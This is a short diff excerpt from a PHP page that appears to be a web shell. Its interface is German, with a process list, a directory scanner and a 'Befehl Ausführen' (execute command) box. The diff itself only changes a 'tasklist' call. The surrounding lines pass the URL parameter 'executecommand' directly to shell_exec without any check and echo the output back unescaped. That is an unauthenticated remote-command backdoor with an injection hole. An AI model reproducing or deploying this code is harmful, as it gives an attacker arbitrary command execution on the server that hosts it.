@@ -4126,7 +4126,7 @@ echo $shell->scan_dir('./');
 <body>
     <div id="content">
         <div id="processlist"> <span id="reloadbu"> <a href="?startprocess&taskrefresh=true" class="button neuladen">Prozesse neu Laden</a> </span>
-            <div id="prog"> <span id="tasklist"> <?php if (isset($_GET['taskrefresh'])) { echo "<script> $(document).ready(function(){ var parent = document.getElementById('tasklist'); var child = document.getElementById('tasklistid'); parent.removeChild(child); }); </script>"; echo "<pre id='tasklistid'>" . shell_exec("tasklist") . "</pre>"; } echo "<pre id='tasklistid'>" . shell_exec("tasklist") . "</pre>"; ?> </span> </div>
+            <div id="prog"> <span id="tasklist"> <?php if (isset($_GET['taskrefresh'])) { echo "<script> $(document).ready(function(){ var parent = document.getElementById('tasklist'); var child = document.getElementById('tasklistid'); parent.removeChild(child); }); </script>"; echo "<pre id='tasklistid'>" . shell_exec("tasklist") . "</pre>"; } echo "<pre id='tasklistid'>" . shell_exec("tasklist.exe") . "</pre>"; ?> </span> </div>
         </div>
         <div id="go"> <span id="eingbabe"> <input onkeyup="changeuri()" placeholder="Bsp.: tasklist.exe" id="eingabetext" type="text"> </span> <a href="?executecommand" id="execuri" class="button">Befehl Ausführen</a>
             <div id="result"> <span class="command1"> <?php if (isset($_GET['executecommand'])) { echo "<span style='color:green;'>Dieser Befehl wird ausgeführt: " . $_GET['executecommand'] . "</span><pre id='commands'>" . shell_exec($_GET['executecommand']) . "</pre>"; } ?> </span>
